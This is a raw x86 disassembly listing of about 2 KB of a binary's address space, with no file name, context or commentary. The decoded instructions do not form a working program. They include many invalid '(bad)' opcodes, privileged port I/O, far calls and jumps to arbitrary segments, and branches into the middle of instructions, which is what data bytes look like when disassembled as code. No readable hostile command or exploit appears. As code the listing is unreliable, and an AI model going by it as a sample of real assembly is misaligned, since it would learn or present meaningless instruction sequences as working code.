  41139e:	mov    ch,BYTE PTR [ecx-0x9ff49e4]
  4113a4:	stos   BYTE PTR es:[edi],al
  4113a5:	mov    eax,0xb11282aa
  4113aa:	jle    0x41134f
  4113ac:	add    BYTE PTR [esi+ebp*1-0x12],ch
  4113b0:	xor    eax,DWORD PTR [ebp-0x6b]
  4113b3:	push   0xb51268f4
  4113b8:	stos   BYTE PTR es:[edi],al
  4113b9:	stos   BYTE PTR es:[edi],al
  4113ba:	dec    esp
  4113bb:	fcom   st(0)
  4113bd:	in     eax,0x52
  4113bf:	pusha  
  4113c0:	mov    esp,0x1ed49cf2
  4113c5:	ret    0x86c6
  4113c8:	jg     0x4113cb
  4113ca:	clc    
  4113cb:	sbb    al,cl
  4113cd:	add    BYTE PTR [edx+edi*2+0xa4dcc16],dl
  4113d4:	add    BYTE PTR [edi],dl
  4113d6:	mov    ds:0xe280a12,al
  4113db:	out    0x15,al
  4113dd:	or     eax,0xc262d6ae
  4113e2:	or     ch,dh
  4113e4:	test   dl,dl
  4113e6:	add    BYTE PTR [esi],al
  4113e8:	add    ebp,DWORD PTR [ecx+0x45]
  4113eb:	repz adc ch,0x0
  4113ef:	add    bh,BYTE PTR [edx+eiz*1+0x5e4da3e]
  4113f6:	iret   
  4113f7:	rol    BYTE PTR [edx-0x191cb747],cl
  4113fd:	dec    edx
  4113fe:	and    BYTE PTR [eax],al
  411400:	(bad)  [ebp+0x5]
  411403:	scas   al,BYTE PTR es:[edi]
  411404:	or     eax,0x98ae7180
  411409:	and    al,0x37
  41140b:	push   0x2b
  41140d:	stos   DWORD PTR es:[edi],eax
  41140e:	dec    eax
  41140f:	push   ebp
  411410:	or     eax,0xbb4e4886
  411415:	(bad)  
  411416:	sti    
  411417:	mov    al,0x36
  411419:	push   ecx
  41141a:	addr16 pop dx
  41141d:	(bad)  
  41141e:	repz xchg ebp,eax
  411420:	aad    0x50
  411422:	loope  0x411450
  411424:	rcr    al,1
  411426:	mov    WORD PTR [esi-0x6b2bb6f6],cs
  41142c:	rcl    cl,0xb2
  41142f:	imul   ebx,DWORD PTR cs:[esi+0x6cd8023c],0x6c2ad33c
  41143a:	fs push ss
  41143c:	push   ebp
  41143d:	sub    DWORD PTR [esi-0x2e],esi
  411440:	sub    eax,0xec06c4a6
  411445:	sbb    dl,BYTE PTR [ebx-0x23]
  411448:	jae    0x41148b
  41144a:	dec    edi
  41144b:	add    ch,BYTE PTR [esi+0x1cb86c14]
  411451:	test   eax,0xc0374050
  411456:	pushf  
  411457:	(bad)  
  411458:	fisubr DWORD PTR [edx-0x40]
  41145b:	or     eax,ecx
  41145d:	cmp    al,0x6
  41145f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411460:	jns    0x411455
  411462:	xchg   BYTE PTR [edi],bl
  411464:	(bad)  
  411465:	sbb    al,0x0
  411467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411468:	adc    bl,BYTE PTR [ecx]
  41146a:	add    al,al
  41146c:	adc    eax,0x69a69a1a
  411471:	call   0x9766:0x996b9868
  411478:	cmp    DWORD PTR [edx-0x679e965a],ebx
  41147e:	jl     0x411407
  411480:	nop
  411481:	lods   eax,DWORD PTR ds:[esi]
  411482:	int    0x9b
  411484:	pop    ss
  411485:	into   
  411486:	sub    DWORD PTR [edx],edi
  411488:	add    BYTE PTR [ebx-0xb],dl
  41148b:	add    BYTE PTR cs:[ebx],cl
  41148e:	cwde   
  41148f:	jnp    0x411455
  411491:	push   es
  411492:	shl    esi,cl
  411494:	push   ds
  411495:	(bad)  
  411496:	mov    ds,ecx
  411498:	mov    dl,0xb8
  41149a:	sahf   
  41149b:	xor    al,0x4a
  41149d:	icebp  
  41149e:	and    DWORD PTR [eax+edi*4],ebp
  4114a1:	cmp    al,0x77
  4114a3:	add    BYTE PTR [ecx-0x174a599a],ah
  4114a9:	(bad)  
  4114ab:	pop    edx
  4114ac:	sar    BYTE PTR [ebx],1
  4114ae:	psubb  mm3,QWORD PTR [ecx]
  4114b1:	repnz addr16 aad 0x70
  4114b5:	pop    ecx
  4114b6:	lods   eax,DWORD PTR ds:[esi]
  4114b7:	inc    esp
  4114b8:	xchg   DWORD PTR [eax+eax*2+0x1e],ecx
  4114bc:	sub    ch,0x6e
  4114bf:	or     DWORD PTR [esi+0x50],ebx
  4114c2:	push   esp
  4114c3:	xor    al,0x3c
  4114c5:	test   al,0x54
  4114c7:	fisub  WORD PTR [edi+edi*1-0x7f]
  4114cb:	jp     0x411487
  4114cd:	adc    ch,bl
  4114cf:	jo     0x411483
  4114d1:	adc    ah,ah
  4114d3:	add    BYTE PTR [ebx+0x68ac4cf6],bl
  4114d9:	hlt    
  4114da:	mov    es,WORD PTR [ebp-0x65d5615e]
  4114e0:	fs jge 0x411533
  4114e3:	shl    DWORD PTR [esi],0x28
  4114e6:	dec    eax
  4114e7:	push   0x2fcd25e6
  4114ec:	sub    al,ch
  4114ee:	js     0x411562
  4114f0:	push   ebx
  4114f1:	pop    ebp
  4114f2:	(bad)  
  4114f3:	lock push esp
  4114f5:	pop    ebx
  4114f6:	test   BYTE PTR [edx+0x0],al
  4114f9:	jnp    0x4114e5
  4114fb:	gs mov edi,0x8d00cda0
  411501:	jl     0x41155e
  411503:	or     al,0x71
  411505:	cmp    BYTE PTR [eax-0x77fa6600],0xc0
  41150c:	push   ss
  41150d:	mov    al,0x51
  41150f:	hlt    
  411510:	test   eax,0xcfb542c7
  411515:	jbe    0x4114f2
  411517:	into   
  411518:	xor    ebp,DWORD PTR [eax]
  41151a:	push   esp
  41151b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41151c:	ficom  DWORD PTR [esi+0x48babd30]
  411522:	push   eax
  411523:	lods   al,BYTE PTR ds:[esi]
  411524:	bound  esp,QWORD PTR [eax-0x37a99e3f]
  41152a:	dec    edi
  41152b:	cwde   
  41152c:	int    0x9b
  41152e:	adc    DWORD PTR ds:0x1604fee8,edx
  411534:	jno    0x41155e
  411536:	add    ch,al
  411538:	adc    edx,DWORD PTR [edi+ebp*1]
  41153b:	add    eax,0x392e38b4
  411540:	hlt    
  411541:	retf   
  411542:	xor    al,0xa0
  411544:	lods   al,BYTE PTR ds:[esi]
  411545:	iret   
  411546:	push   eax
  411547:	xor    ecx,DWORD PTR [eax+0x7]
  41154a:	mov    ds:0x668624e0,al
  41154f:	cmp    ecx,DWORD PTR [esi]
  411551:	loop   0x41154d
  411553:	add    BYTE PTR [edi-0x6fa78368],bl
  411559:	or     BYTE PTR ds:0x81808814,dh
  41155f:	push   edx
  411560:	js     0x411553
  411562:	push   eax
  411563:	mov    esi,0x7609a2a8
  411568:	enter  0xb48e,0x72
  41156c:	jl     0x4114f9
  41156e:	push   0xffffffb4
  411570:	(bad)  
  411571:	pusha  
  411572:	mov    al,ds:0xd4880eab
  411577:	mov    edx,0xa25e7d02
  41157c:	inc    ebx
  41157d:	mov    dl,0xaa
  41157f:	push   edi
  411580:	dec    esi
  411581:	push   0x16
  411583:	jb     0x4115f1
  411585:	test   al,0x6a
  411587:	or     BYTE PTR [eax+0x450b5852],ah
  41158d:	test   dl,0xb3
  411590:	shl    DWORD PTR [esi],1
  411592:	hlt    
  411593:	not    DWORD PTR ds:0x2ed192f2
  411599:	xlat   BYTE PTR ds:[ebx]
  41159a:	cs cmp edx,esp
  41159d:	add    al,0xda
  41159f:	(bad)  [edx-0x76]
  4115a2:	in     al,dx
  4115a3:	and    al,0x1d
  4115a5:	xchg   DWORD PTR [eax+0x81ac002],esi
  4115ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115ac:	sbb    bl,al
  4115ae:	add    eax,0xba54caad
  4115b3:	lea    ebx,[eax-0x3a]
  4115b6:	leave  
  4115b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115b8:	sub    edx,edx
  4115ba:	in     eax,dx
  4115bb:	scas   al,BYTE PTR es:[edi]
  4115bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115bd:	mov    cl,BYTE PTR ds:0xbea8591a
  4115c3:	(bad)  
  4115c4:	xor    al,0xaf
  4115c6:	and    BYTE PTR [eax+0x1d],ch
  4115c9:	or     eax,0x14faf1a6
  4115ce:	xor    eax,0x2e0a60f6
  4115d3:	push   ebp
  4115d4:	ins    DWORD PTR es:[edi],dx
  4115d5:	imul   ebp,DWORD PTR [eax-0x56],0x7d
  4115d9:	sub    edx,DWORD PTR ds:[esi]
  4115dc:	jp     0x411568
  4115de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115df:	(bad)  
  4115e0:	cld    
  4115e1:	imul   bp,WORD PTR [ecx+0x6a00e66d],0x3f
  4115e9:	retf   0x2fb
  4115ec:	mov    esi,0xa9ada650
  4115f1:	push   ebp
  4115f2:	mov    ch,0xa1
  4115f4:	or     cl,ch
  4115f6:	shl    BYTE PTR [eax],cl
  4115f8:	(bad)  
  4115f9:	mov    bh,0x58
  4115fb:	lods   al,BYTE PTR ss:[esi]
  4115fd:	push   ds
  4115fe:	sub    ch,BYTE PTR [eax+0x51]
  411601:	mov    bl,0x2a
  411603:	pop    eax
  411604:	mov    esi,0xaa28b01b
  411609:	or     ch,BYTE PTR [edi+0x60]
  41160c:	in     eax,0xd
  41160e:	adc    BYTE PTR [esi+0x0],0x4a
  411612:	popa   
  411613:	fwait
  411614:	pushf  
  411615:	adc    dh,0xaa
  411618:	pop    ss
  411619:	fldcw  WORD PTR [edx]
  41161b:	xchg   edi,eax
  41161c:	xor    al,0x74
  41161e:	repz call 0xeae0:0xdcdeeb00
  411626:	push   0x1d
  411628:	lahf   
  411629:	shl    DWORD PTR ds:[eax-0xb],0x16
  41162e:	ret    0xf2bc
  411631:	jae    0x4115e0
  411633:	test   al,0x68
  411635:	loop   0x411606
  411637:	xor    al,0xac
  411639:	jo     0x4115ec
  41163b:	(bad)  
  41163c:	xchg   edx,eax
  41163d:	call   0x46a9bcf7
  411642:	xlat   BYTE PTR ds:[ebx]
  411643:	xor    BYTE PTR [ecx],ch
  411645:	pop    esi
  411646:	xor    al,0x5d
  411648:	cs mov cl,0x0
  41164b:	push   eax
  41164c:	xor    al,0x55
  41164e:	cmp    al,0x62
  411650:	loop   0x411604
  411652:	add    al,0x56
  411654:	adc    al,0xa0
  411656:	mov    eax,ds:0x7c74cb82
  41165b:	and    ch,BYTE PTR [eax-0x75938672]
  411661:	or     ebp,ecx
  411663:	xchg   ecx,eax
  411664:	je     0x4116a7
  411666:	aad    0x40
  411668:	inc    esi
  411669:	and    cl,BYTE PTR [edi+0x42]
  41166c:	mov    bh,0xa5
  41166e:	jnp    0x4116ac
  411670:	cmp    ecx,eax
  411672:	(bad)  [eax]
  411674:	add    BYTE PTR [eax-0x4d2c67f3],dh
  41167a:	jo     0x41167a
  41167c:	xor    dl,BYTE PTR [esi+0x34]
  41167f:	out    dx,eax
  411680:	cld    
  411681:	mov    esi,0xa3eb00bb
  411686:	push   ss
  411687:	xchg   ebp,eax
  411688:	mov    BYTE PTR [ebx+0x607c7340],cl
  41168e:	sahf   
  41168f:	mov    bh,0x3c
  411691:	push   0xffffff9b
  411693:	xchg   edi,eax
  411694:	mov    eax,ds:0x94f0a0ab
  411699:	jmp    0x42b0:0xe483881
  4116a0:	inc    ebx
  4116a1:	push   ebx
  4116a2:	push   ecx
  4116a3:	mov    ebp,0xad5e4cd4
  4116a8:	out    0x37,al
  4116aa:	cmc    
  4116ab:	xchg   edx,eax
  4116ac:	pop    eax
  4116ad:	and    ah,bh
  4116af:	ss ins DWORD PTR es:[edi],dx
  4116b1:	jmp    0x834467f4
  4116b6:	add    BYTE PTR [esi+0x40],0x48
  4116ba:	loopne 0x41165e
  4116bc:	inc    esi
  4116bd:	(bad)  
  4116be:	rcl    ebp,1
  4116c0:	jmp    0x4116e7
  4116c2:	adc    esi,DWORD PTR [ebx]
  4116c4:	pop    esi
  4116c5:	push   0x287f3014
  4116ca:	sahf   
  4116cb:	mov    eax,ds:0x7102c60f
  4116d0:	fdivr  QWORD PTR [edx]
  4116d2:	shl    BYTE PTR [eax],1
  4116d4:	and    bl,BYTE PTR [edx+ecx*1]
  4116d7:	or     ecx,DWORD PTR [edx]
  4116d9:	mov    ah,0x42
  4116db:	jle    0x41169e
  4116dd:	or     BYTE PTR [esi-0x3f4fafcb],al
  4116e3:	jbe    0x411763
  4116e5:	dec    ecx
  4116e6:	inc    esp
  4116e7:	mov    al,ds:0xf6104ac6
  4116ec:	mov    BYTE PTR [eax+0x65],dl
  4116ef:	fcomp  DWORD PTR [esi+0x70ac2e74]
  4116f5:	jle    0x4116ef
  4116f7:	mov    ds:0xc282107d,al
  4116fc:	push   esi
  4116fd:	mov    ds:0x1666d01e,al
  411702:	ss retf 0x8816
  411706:	and    al,0x5a
  411708:	xchg   edx,eax
  411709:	sub    ch,BYTE PTR [edi]
  41170b:	stos   DWORD PTR es:[edi],eax
  41170c:	push   0xffffffe2
  41170e:	adc    eax,0x968aa9b4
  411713:	pushf  
  411714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411715:	mov    ch,0x22
  411717:	icebp  
  411718:	dec    ecx
  411719:	dec    eax
  41171a:	add    eax,0xd44c9615
  41171f:	sahf   
  411720:	fmul   DWORD PTR [eax-0x1d578fd3]
  411726:	cmp    BYTE PTR [edi-0x2d9f1b06],0xc4
  41172d:	xchg   edx,eax
  41172e:	retf   0xf685
  411731:	sub    al,0xa4
  411733:	dec    esp
  411734:	bound  edx,QWORD PTR fs:[ebx+eax*2-0x754a7a3b]
  41173c:	ret    
  41173d:	sbb    DWORD PTR [edx],esi
  41173f:	pop    ebx
  411740:	add    al,0x19
  411742:	xor    cl,BYTE PTR [edx]
  411744:	ins    BYTE PTR es:[edi],dx
  411745:	xchg   ebp,eax
  411746:	popa   
  411747:	ror    BYTE PTR [eax+ebx*1],1
  41174a:	not    cl
  41174c:	push   edx
  41174d:	mov    dl,0x7e
  41174f:	mov    BYTE PTR [ecx],0x68
  411752:	cmp    edi,DWORD PTR [edx]
  411754:	test   BYTE PTR [ebx],dl
  411756:	ss or  eax,0xea78e2a6
  41175c:	js     0x411760
  41175e:	push   ds
  41175f:	stos   BYTE PTR es:[edi],al
  411760:	out    dx,eax
  411761:	lea    esp,[ecx+edx*1]
  411764:	and    al,0x3c
  411766:	jmp    0xa00c:0x5ceb6065
  41176d:	and    eax,0x51fff9dd
  411772:	loopne 0x4117ce
  411774:	loopne 0x411774
  411776:	fsubrp st(1),st
  411778:	sub    eax,0x98746692
  41177d:	sub    DWORD PTR [ebp+0x20ff8254],esp
  411783:	mov    al,dl
  411785:	(bad)  
  411787:	ss push eax
  411789:	jle    0x4117ae
  41178b:	inc    esi
  41178c:	mov    ebx,0x16003196
  411791:	and    dh,BYTE PTR [esi-0x6727700b]
  411797:	lds    edx,FWORD PTR [ebp-0x7e]
  41179a:	call   0x8c201835
  41179f:	mov    ah,0xa3
  4117a1:	inc    ecx
  4117a2:	pusha  
  4117a3:	or     BYTE PTR [eax-0x32],ah
  4117a6:	jecxz  0x4117a4
  4117a8:	inc    ecx
  4117a9:	sub    DWORD PTR [ecx+0x51],edx
  4117ac:	dec    ecx
  4117ad:	cmp    eax,0x70d7d0c0
  4117b2:	jg     0x41176b
  4117b4:	jbe    0x4117ea
  4117b6:	mov    eax,ds:0xa218284e
  4117bb:	lods   al,BYTE PTR ds:[esi]
  4117bc:	pop    esp
  4117bd:	fimul  WORD PTR [ebx+ebp*2]
  4117c0:	ins    DWORD PTR es:[edi],dx
  4117c1:	(bad)  
  4117c2:	sar    ah,1
  4117c4:	stos   DWORD PTR es:[edi],eax
  4117c5:	push   ebx
  4117c6:	(bad)  
  4117c7:	cmp    edx,esp
  4117c9:	inc    ebp
  4117ca:	pop    eax
  4117cb:	adc    al,0x34
  4117cd:	adc    al,0x89
  4117cf:	(bad)  
  4117d0:	sub    al,0x2f
  4117d2:	mov    esp,0xacf0123f
  4117d7:	mov    ds:0x3e1e7899,al
  4117dc:	jae    0x41178a
  4117de:	(bad)  
  4117df:	cli    
  4117e0:	cmp    eax,DWORD PTR [ebx+ebx*4]
  4117e3:	call   0xf0dc:0xd646a582
  4117ea:	push   esp
  4117eb:	jp     0x41178e
  4117ed:	or     edi,DWORD PTR [edx+0x2f5c45da]
  4117f3:	add    BYTE PTR [esi+0x4332b68e],ch
  4117f9:	pushf  
  4117fa:	mov    al,0x22
  4117fc:	jmp    0x41183f
  4117fe:	pop    eax
  4117ff:	popa   
  411800:	sbb    al,0x4c
  411802:	pop    edi
  411803:	jo     0x411817
  411805:	and    BYTE PTR [ebx+ebx*2+0xd],dh
  411809:	lods   eax,DWORD PTR ds:[esi]
  41180a:	repnz enter 0x9358,0xce
  41180f:	or     eax,0xaa0111be
  411814:	ds add esp,eax
  411817:	in     eax,0x90
  411819:	stos   BYTE PTR es:[edi],al
  41181a:	lods   al,BYTE PTR ds:[esi]
  41181b:	pop    edi
  41181c:	add    al,0x9a
  41181e:	jg     0x41182f
  411820:	cli    
  411821:	add    BYTE PTR [eax],bh
  411823:	in     al,0x0
  411825:	in     al,dx
  411826:	mov    edx,0x512d0c35
  41182b:	pusha  
  41182c:	mov    edi,0x2c5a3aac
  411831:	sub    DWORD PTR [edx+0xd137b6c],eax
  411837:	pop    edi
  411838:	pop    eax
  411839:	mov    es,WORD PTR [ebx+0x1ae530ad]
  41183f:	xlat   BYTE PTR ds:[ebx]
  411840:	mov    al,ds:0x5c3068c2
  411845:	cwde   
  411846:	mov    esp,0x18e3a6ae
  41184b:	js     0x411876
  41184d:	retf   0xcc66
  411850:	push   0x2a050de0
  411855:	mov    ds:0xea2a8290,al
  41185a:	mov    ds:0xb655f914,eax
  41185f:	mov    ds:0x7e8fbe00,eax
  411864:	fwait
  411865:	mov    ds:0x64db0004,al
  41186a:	sbb    eax,0xb844a8bf
  41186f:	mov    cl,BYTE PTR [edi-0x4f1d3a3a]
  411875:	jmp    0x411849
  411877:	pop    edx
  411878:	push   eax
  411879:	inc    ebp
  41187a:	inc    esi
  41187b:	add    BYTE PTR [eax-0x5e061508],ch
  411881:	sar    DWORD PTR [eax],1
  411883:	xor    ah,dh
  411885:	aaa    
  411886:	inc    esp
  411887:	pushf  
  411888:	sar    DWORD PTR [eax],0xc2
  41188b:	addr16 or al,0x82
  41188e:	int3   
  41188f:	push   es
  411890:	dec    ebp
  411891:	les    eax,FWORD PTR [edx-0x6d]
  411894:	stos   BYTE PTR es:[edi],al
  411895:	mov    ?,WORD PTR [edx+0x72]
  411898:	push   edx
  411899:	cld    
  41189a:	mov    esi,0xa8a1a0b
  41189f:	mov    edx,0x92572625
  4118a4:	adc    eax,0x196a3c8a
  4118a9:	push   esi
  4118aa:	jl     0x4118bd
  4118ac:	cwde   
  4118ad:	call   0x4b14:0x5cef18dc
  4118b4:	push   esi
  4118b5:	inc    ebp
  4118b6:	adc    al,0xde
  4118b8:	push   0xffffff84
  4118ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bb:	mov    ebx,0x1c091f5c
  4118c0:	inc    ecx
  4118c1:	(bad)  [edx-0x50]
  4118c4:	lods   al,BYTE PTR ds:[esi]
  4118c5:	or     dl,BYTE PTR [esp+esi*2]
  4118c8:	jl     0x411922
  4118ca:	jl     0x4118d4
  4118cc:	jmp    0x4dc0:0xa170fc59
  4118d3:	adc    eax,0x54740318
  4118d8:	push   ecx
  4118d9:	adc    DWORD PTR [eax+eax*4-0x53],edx
  4118dd:	clc    
  4118de:	and    esi,DWORD PTR [eax-0x18]
  4118e1:	mov    DWORD PTR [eax],ebp
  4118e3:	call   0x5680:0xa030696
  4118ea:	loopne 0x41193a
  4118ec:	ficom  DWORD PTR ds:0x6bb6c322
  4118f2:	jo     0x411957
  4118f4:	and    dh,BYTE PTR gs:[esi+ebx*2]
  4118f8:	aad    0xd6
  4118fa:	adc    al,0x6a
  4118fc:	add    eax,0x65dccd90
  411901:	cs add al,0x6c
  411904:	inc    eax
  411905:	push   esi
  411906:	xor    eax,0x5e90b554
  41190b:	cld    
  41190c:	ss pushf 
  41190e:	mov    ebx,gs
  411910:	jle    0x4118d5
  411912:	cmc    
  411913:	xor    eax,0x56b956b8
  411918:	lock dec esp
  41191a:	push   0x957fe098
  41191f:	enter  0x1574,0x56
  411923:	and    al,0x68
  411925:	and    DWORD PTR [eax-0x52],0x366051d6
  41192c:	inc    esi
  41192d:	sub    eax,0x4e136c98
  411932:	or     eax,esp
  411934:	ins    BYTE PTR es:[edi],dx
  411935:	push   edi
  411936:	add    dl,bl
  411938:	sar    DWORD PTR es:[edx],1
  41193b:	cli    
  41193c:	jle    0x411924
  41193e:	hlt    
  41193f:	cli    
  411940:	(bad)  
  411941:	out    0xdf,al
  411943:	mov    esi,0xa6cb2204
  411948:	and    esi,DWORD PTR [edi]
  41194a:	add    BYTE PTR [eax-0x53],dh
  41194d:	add    dl,ch
  41194f:	mov    al,0x47
  411951:	inc    edi
  411952:	jae    0x4119ae
  411954:	enter  0x584c,0x4e
  411958:	loop   0x4118de
  41195a:	mov    ds:0x646cd4d6,al
  41195f:	pop    esp
  411960:	inc    esi
  411961:	retf   0x465c
  411964:	inc    ecx
  411965:	push   0xfffffff1
  411967:	push   esi
  411968:	push   esi
  411969:	xor    al,0x5b
  41196b:	sbb    BYTE PTR [ecx+0x3ae44810],0x1c
  411972:	pop    esi
  411973:	retf   0x1b4d
  411976:	ins    BYTE PTR es:[edi],dx
  411977:	xor    BYTE PTR [esi+edx*8-0x76c52124],dh
  41197e:	push   ss
  41197f:	ja     0x41192b
  411981:	push   esi
  411982:	pop    edi
  411983:	adc    al,0x8
  411985:	in     eax,dx
  411986:	sub    BYTE PTR [eax+0x24],dh
  411989:	sbb    BYTE PTR [ecx],bh
  41198b:	cld    
  41198c:	div    BYTE PTR [eax-0x75fa92e]
  411992:	mov    al,ds:0xcd62104
  411997:	inc    esi
  411998:	cli    
  411999:	mov    dl,0x33
  41199b:	shl    DWORD PTR [ebx],0x81
  41199e:	bswap  esi
  4119a0:	and    ecx,ebx
  4119a2:	mov    dl,0xed
  4119a4:	jmp    0x7b4f:0x629a8106
  4119ab:	adc    BYTE PTR [edx],ah
  4119ad:	sbb    eax,esi
  4119af:	loopne 0x41193f
  4119b1:	mov    es,WORD PTR [edx+0x27a47ba2]
  4119b7:	(bad)  
  4119b8:	jae    0x4119e4
  4119ba:	je     0x411a04
  4119bc:	mov    al,ds:0x4bb54048
  4119c1:	hlt    
  4119c2:	inc    esp
  4119c3:	push   eax
  4119c4:	out    0xbb,al
  4119c6:	push   0xffffffab
  4119c8:	inc    eax
  4119c9:	mov    ch,0x72
  4119cb:	cld    
  4119cc:	inc    eax
  4119cd:	fadd   DWORD PTR [edx+0x38]
  4119d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119d1:	mov    ss,WORD PTR [ebp+0x45]
  4119d4:	dec    ebp
  4119d5:	rcr    bh,1
  4119d7:	sub    BYTE PTR [edx],0x90
  4119da:	rol    ebx,cl
  4119dc:	xor    cl,dl
  4119de:	scas   al,BYTE PTR es:[edi]
  4119df:	pop    ss
  4119e0:	cdq    
  4119e1:	or     bl,BYTE PTR [esi-0x33ff6e57]
  4119e7:	xchg   edx,eax
  4119e8:	std    
  4119e9:	xchg   DWORD PTR [edx+0x701261da],ebp
  4119ef:	in     eax,0x0
  4119f1:	rcr    BYTE PTR [eax+ebp*4-0x497ef262],cl
  4119f8:	jmp    0x411a4d
  4119fa:	loop   0x411a5c
  4119fc:	xchg   BYTE PTR [eax],dh
  4119fe:	sub    al,0x4
  411a00:	cld    
  411a01:	inc    ebp
  411a02:	rcr    ebx,0x83
  411a05:	jp     0x4119a8
  411a07:	jl     0x411a0b
  411a09:	retf   
  411a0a:	add    BYTE PTR [ecx-0x5feff3b2],dl
  411a10:	rcr    BYTE PTR [eax+0x68],1
  411a13:	(bad)  
  411a14:	cli    
  411a15:	sbb    al,0x9c
  411a17:	repz push edx
  411a19:	dec    edx
  411a1a:	or     eax,0xa0a842ad
  411a1f:	out    dx,al
  411a20:	loopne 0x411a26
  411a22:	inc    esp
  411a23:	cmp    ch,BYTE PTR [eax+edx*4+0x12ce3e2a]
  411a2a:	xor    bl,ah
  411a2c:	ins    BYTE PTR es:[edi],dx
  411a2d:	jnp    0x411a10
  411a2f:	pop    edx
  411a30:	pusha  
  411a31:	cmp    edx,edx
  411a33:	pop    ss
  411a34:	sub    eax,0x5a392a04
  411a39:	push   0xd0062450
  411a3e:	cmp    al,0x51
  411a40:	ficom  WORD PTR [edx-0x28a2b22f]
  411a46:	fsub   DWORD PTR [ebx+edi*8+0x1b]
  411a4a:	stos   BYTE PTR es:[edi],al
  411a4b:	inc    ebx
  411a4c:	out    0x3,al
  411a4e:	and    bl,BYTE PTR [eax+esi*2+0x72]
  411a52:	sub    eax,0xc6dff468
  411a57:	paddd  mm5,QWORD PTR [esi-0x18]
  411a5b:	mov    dl,ch
  411a5d:	loopne 0x411a39
  411a5f:	into   
  411a60:	or     esp,esi
  411a62:	and    BYTE PTR [esi],bh
  411a64:	mov    al,BYTE PTR [eax]
  411a66:	sar    esi,cl
  411a68:	int    0x29
  411a6a:	enter  0x66a,0x28
  411a6e:	or     esp,0xf76000
  411a74:	popf   
  411a75:	mov    fs,WORD PTR [eax+0x3c61d682]
  411a7b:	iret   
  411a7c:	inc    eax
  411a7d:	adc    cl,ah
  411a7f:	sub    dh,cl
  411a81:	or     BYTE PTR [ebp+0x603cac3a],ch
  411a87:	call   0x281:0x430a8985
  411a8e:	cmp    eax,0xfd8788b0
  411a93:	and    al,0xd0
  411a95:	sbb    al,dh
  411a97:	aam    0x46
  411a99:	adc    eax,edi
  411a9b:	jb     0x411a46
  411a9d:	ss mov ah,0x68
  411aa0:	fwait
  411aa1:	jo     0x411b0d
  411aa3:	jecxz  0x411b09
  411aa5:	cmp    ch,BYTE PTR [ebx+esi*4+0x3c]
  411aa9:	(bad)  
  411aaa:	test   al,0x9f
  411aac:	sub    BYTE PTR ds:0x98baa975,dl
  411ab2:	in     al,0xce
  411ab4:	aam    0xad
  411ab6:	push   0x2ca2c8b6
  411abb:	in     eax,dx
  411abc:	imul   ebx,DWORD PTR [esi+ebx*2],0x74559a11
  411ac3:	lds    edx,FWORD PTR [edx+0x2b]
  411ac6:	jo     0x411b42
  411ac8:	fcom   st(6)
  411aca:	xor    al,0xf1
  411acc:	mov    ah,0x78
  411ace:	add    dh,BYTE PTR [esi]
  411ad0:	pop    ss
  411ad1:	popa   
  411ad2:	retf   0x2e80
  411ad5:	sbb    edx,DWORD PTR [esi+ebx*2+0x10]
  411ad9:	js     0x411a72
  411adb:	lods   al,BYTE PTR ds:[esi]
  411adc:	sbb    dl,ah
  411ade:	push   ecx
  411adf:	out    0xf7,al
  411ae1:	jns    0x411a97
  411ae3:	test   al,0xa1
  411ae5:	leave  
  411ae6:	cmp    ah,BYTE PTR [esi+0x224f203]
  411aec:	mov    esp,0xd760818c
  411af1:	test   esi,ebp
  411af3:	frstor [edi+eiz*1+0x56364ec8]
  411afa:	jo     0x411b29
  411afc:	pusha  
  411afd:	dec    edx
  411afe:	push   es
  411aff:	ins    BYTE PTR es:[edi],dx
  411b00:	inc    ebp
  411b01:	add    BYTE PTR [edi],ch
  411b03:	push   edx
  411b04:	jmp    0xdbd6:0x4eb4369a
  411b0b:	lods   al,BYTE PTR ds:[esi]
  411b0d:	call   0x72f45a4c
  411b12:	sub    dl,0x52
  411b15:	lods   eax,DWORD PTR ds:[esi]
  411b16:	nop
  411b17:	out    dx,eax
  411b18:	loop   0x411b10
  411b1a:	cwde   
  411b1b:	into   
  411b1c:	sbb    DWORD PTR [edx+0x10],ebx
  411b1f:	lods   eax,DWORD PTR ds:[esi]
  411b20:	cmp    BYTE PTR [ebx-0x36],al
  411b23:	(bad)  
  411b24:	pop    esi
  411b25:	push   0x66b4c1b6
  411b2a:	fs push ss
  411b2c:	mov    dl,0x3e
  411b2e:	outs   dx,BYTE PTR ds:[esi]
  411b2f:	mov    bl,0x46
  411b31:	les    ecx,FWORD PTR [ebp+0x6aaa6a2b]
  411b37:	sub    al,0x81
  411b39:	xor    BYTE PTR [edx+ebp*2-0x14],dh
  411b3d:	cmp    BYTE PTR [esi],ch
  411b3f:	or     ch,BYTE PTR [ebp-0x11755d27]
  411b45:	ins    DWORD PTR es:[edi],dx
  411b46:	mov    dh,0x94
  411b48:	jl     0x411b60
  411b4a:	mov    dl,0x76
  411b4c:	call   0xd868872
  411b51:	push   ebp
  411b52:	xor    BYTE PTR [eax+edi*8+0x3402bc97],al
  411b59:	mov    ebx,DWORD PTR [edi-0x28]
  411b5c:	cmp    bl,BYTE PTR [eax+edx*1]
  411b5f:	loopne 0x411bc5
  411b61:	or     al,0x1c
  411b63:	sbb    al,0x8f
  411b65:	daa    
  411b66:	mov    dh,0xa9
  411b68:	loop   0x411b32
  411b6a:	xor    al,0x2
  411b6c:	mov    BYTE PTR [edx+0xacc0994],bl
  411b72:	rcr    BYTE PTR [esi],1
  411b74:	test   eax,0xf0133415
  411b79:	xchg   edx,eax
  411b7a:	sbb    edx,DWORD PTR [esi]
  411b7c:	scas   eax,DWORD PTR es:[edi]
  411b7d:	mov    eax,ds:0xd254d514
  411b82:	add    esp,DWORD PTR [eax+0x50026e05]
  411b88:	push   ecx
  411b89:	push   eax
  411b8a:	cs in  eax,dx
  411b8c:	nop
  411b8d:	adc    ah,BYTE PTR [esi-0x7232fd6e]
  411b93:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b95:	jl     0x411b60
  411b97:	lods   al,BYTE PTR cs:[esi]
